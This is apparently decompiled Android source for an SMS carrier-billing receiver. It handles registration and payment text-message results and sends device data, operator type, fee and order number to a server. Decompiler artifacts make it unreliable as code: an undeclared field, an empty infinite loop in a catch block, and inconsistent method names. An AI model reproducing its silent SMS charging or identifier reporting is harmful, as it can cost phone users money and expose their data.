package com.yl.ml.b;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import com.yl.codelib.comm.MyPreference;
import com.yl.codelib.sim.SIMUtil;
import com.yl.codelib.utils.LogUtil;
import com.yl.codelib.utils.NetWorkUtil;
import com.yl.codelib.utils.OperatorUtil;
import com.yl.ml.common.AppDo;
import com.yl.ml.date.PayDetailInfo;
import com.yl.ml.date.Result;
import com.yl.ml.listen.PCallback;
import com.yl.ml.thread.JiSuanSendSmsThread;
import com.yl.ml.view.LoadingDialog;
import java.net.URLDecoder;
import java.util.Map;
import org.json.JSONArray;
import org.json.JSONObject;

final class M
  extends BroadcastReceiver
{
  private PayDetailInfo aP;
  private PCallback aQ;
  private boolean aR = false;
  
  public M(MA paramMA, PayDetailInfo paramPayDetailInfo, PCallback paramPCallback)
  {
    this.aP = paramPayDetailInfo;
    this.aQ = paramPCallback;
    new Thread(new O(this, new N(this, paramPayDetailInfo, paramPCallback))).start();
  }
  
  public final void onReceive(Context paramContext, Intent paramIntent)
  {
    if ((paramIntent != null) && (paramIntent.getAction().equals("SMS_SEND_ACTIOIN")))
    {
      MA.c(this.ak);
      if (!this.aR) {}
    }
    else
    {
      return;
    }
    this.aR = true;
    int i = getResultCode();
    LogUtil.v(i + "resultCode");
    paramContext = paramIntent.getStringExtra("id");
    switch (i)
    {
    default: 
      if ((paramContext != null) && (paramContext.equals("28")))
      {
        AppDo.errorRecord(MA.a(this.ak), 5006, MA.c(), this.aP, MA.d());
        LogUtil.v("IP更新了");
        MA.a(this.ak, this.aQ, MA.c());
        return;
      }
      break;
    case -1: 
      if ((paramContext != null) && (paramContext.equals("28")))
      {
        LogUtil.v("发注册短信成功");
        MA.a(this.ak, this.aQ);
        i = MA.b(this.ak).readInt("zcnum", 0);
        MA.b(this.ak).write("zcnum", i + 1);
        return;
      }
      paramContext = AppDo.getUserBaseDeviceInfo(MA.a(this.ak));
      paramContext.put("status", "11");
      paramContext.put("fee", this.aP.getPassId());
      paramContext.put("orderNo", this.aP.getStringNo());
      paramContext.put("yys", OperatorUtil.getOperatorType(SIMUtil.getIMSI2(MA.a(this.ak)), NetWorkUtil.getNetWork(MA.a(this.ak)), null));
      new Thread(new JiSuanSendSmsThread(null, paramContext)).start();
      if (MA.e().equals("1"))
      {
        if (this.aP.getNowBu() == this.aP.getSmArray().length())
        {
          MA.a(this.ak, this.aP, 9000, this.aQ);
          return;
        }
        MA.a(this.ak, this.aP.getSmsArray(), this.aP.getNowBu(), this.aP, this.aQ);
        return;
      }
      MA.a(this.ak, this.aP, 9000, this.aQ);
      return;
    }
    MA.d(this.ak).dismiss();
    paramContext = AppDo.getUserBaseDeviceInfo(MA.a(this.ak));
    paramContext.put("status", "12");
    paramContext.put("fee", this.aP.getPassId());
    paramContext.put("orderNo", this.aP.getStringNo());
    paramContext.put("yys", OperatorUtil.getOperatorType(SIMUtil.getIMSI2(MA.a(this.ak)), NetWorkUtil.getNetWork(MA.a(this.ak)), null));
    new Thread(new JiSuanSendSmsThread(null, paramContext)).start();
    try
    {
      paramContext = this.aP.getSmsArray().getJSONObject(this.aP.getNowBu() - 1);
      paramIntent = URLDecoder.decode(paramContext.getString("smsContent"), "utf-8");
      Result.putNewErrorCode(4005, paramContext.getString("smsSend") + "发送" + paramIntent.length() + "resultCode=" + i);
      LogUtil.v("支付短信发送失败!");
      MA.a(this.ak, this.aP, 4005, this.aQ);
      return;
    }
    catch (Exception paramContext)
    {
      for (;;) {}
    }
  }
}
